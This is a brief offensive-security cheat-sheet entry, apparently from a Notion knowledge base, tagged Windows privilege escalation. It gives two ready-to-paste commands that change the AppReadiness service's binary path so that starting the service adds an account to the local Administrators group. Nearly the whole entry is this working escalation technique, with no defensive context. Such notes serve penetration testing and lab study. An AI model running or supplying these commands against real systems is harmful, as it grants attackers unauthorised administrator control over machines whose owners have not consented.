# Change service binary path

OS: Windows
Description: Change service binary path
Security Domains: Privilege Escalation (https://www.notion.so/Privilege-Escalation-1444c8e523768043add9c30147563fd8?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
sc start AppReadiness
```